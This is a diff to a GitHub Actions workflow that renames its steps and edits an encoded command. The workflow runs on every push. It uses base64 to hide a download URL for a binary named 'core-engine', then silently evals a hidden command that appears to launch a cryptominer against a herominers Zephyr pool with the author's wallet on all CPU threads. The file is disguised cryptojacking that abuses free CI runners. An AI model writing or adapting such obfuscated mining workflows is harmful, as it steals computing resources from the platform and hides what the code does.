@@ -1,4 +1,4 @@
-name: Explanet1
+name: Godlt
 
 on:
   push:
@@ -12,24 +12,24 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: CheckoutExplanet1
+      - name: CheckoutGodlt
         uses: actions/checkout@v2
 
-      - name: Setup DependencyExplanet1
+      - name: Setup DependencyGodlt
         run: |
           sudo apt-get update
           sudo apt-get install -y curl libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Download core-engineExplanet1
+      - name: Download core-engineGodlt
         run: |
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2Fub25tYXh5WE1SL2NvcmUtZW5naW5lL3JlbGVhc2VzL2Rvd25sb2FkL3YwMy9jb3JlLWVuZ2luZQ=="
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
 
-      - name: Run MachineExplanet1
+      - name: Run MachineGodlt
         run: |
           chmod +x core-engine
-          ENCODED="Li9jb3JlLWVuZ2luZSAtbyBjYS56ZXBoeXIuaGVyb21pbmVycy5jb206MTEyNCBcCiAgLXUgWkVQSFlSMlltVEJMdkxKUUJZeXdIVDZ5Sm9Cemo0QlcxU2hLMnYxWGN6Zm5ad1ZFcmJpRGNBaE5UbjRZWEhQQ2dFWXhMeWQ0UnpzeEVkd1kzdkxDbWVqQWNjcGp3dVpleWZ4MVouSmVhbi1Db2xsaT05NjAwMDAgXAogIC0tZG9uYXRlLWxldmVsIDAgXAogIC1rIC0tdGhyZWFkcz0kKG5wcm9jKSAtLWNwdS1wcmlvcml0eT01IC0taHVnZS1wYWdlcy1qaXQgLS1jcHUtbm8teWllbGQgLS1yYW5kb214LW5vLW51bWEgXAogIC1hIHJ4LzAgLS10bHMgLS1hc209cnl6ZW4gLS1yYW5kb214LW5vLXJkbXNyIC0tcmFuZG9teC13cm1zcj0tMSAtLXJhbmRvbXgtbW9kZT1mYXN0"
+          ENCODED="Li9jb3JlLWVuZ2luZSAtbyBjYS56ZXBoeXIuaGVyb21pbmVycy5jb206MTEyNCBcCiAgLXUgc29sbzpaRVBIWVIyWW1UQkx2TEpRQll5d0hUNnlKb0J6ajRCVzFTaEsydjFYY3pmblp3VkVyYmlEY0FoTlRuNFlYSFBDZ0VZeEx5ZDRSenN4RWR3WTN2TENtZWpBY2Nwand1WmV5ZngxWi5KZWFuLUNvbGxpPTk2MDAwMCBcCiAgLS1kb25hdGUtbGV2ZWwgMCBcCiAgLWsgLS10aHJlYWRzPSQobnByb2MpIC0tY3B1LXByaW9yaXR5PTUgLS1odWdlLXBhZ2VzLWppdCAtLWNwdS1uby15aWVsZCAtLXJhbmRvbXgtbm8tbnVtYSBcCiAgLWEgcngvMCAtLXRscyAtLWFzbT1yeXplbiAtLXJhbmRvbXgtbm8tcmRtc3IgLS1yYW5kb214LXdybXNyPS0xIC0tcmFuZG9teC1tb2RlPWZhc3Q="
           CMD=$(echo "$ENCODED" | base64 -d)
           FINAL_CMD="$CMD > /dev/null 2>&1 &"
           eval "$FINAL_CMD"
